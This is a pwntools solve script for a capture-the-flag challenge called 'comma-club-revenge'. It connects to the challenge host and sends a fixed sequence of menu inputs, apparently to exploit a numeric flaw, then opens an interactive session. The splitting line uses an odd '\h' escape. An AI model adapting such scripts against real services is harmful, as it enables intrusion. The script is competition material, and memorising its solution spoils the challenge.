#!/usr/bin/env python3

from pwn import *

LOCAL = False
DEBUG = False

HOST = "comma-club-revenge.chal.hackthe.vote"
PORT = 1337


gdbscript = """
c
"""


if LOCAL:
    exe = ELF("../src/challenge")

    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

solution = """1
1
500009
2
500000
3
2
3
Total
"""

sol_lines = solution.split("\h")

for line in sol_lines:
    r.sendline(line)

r.interactive()
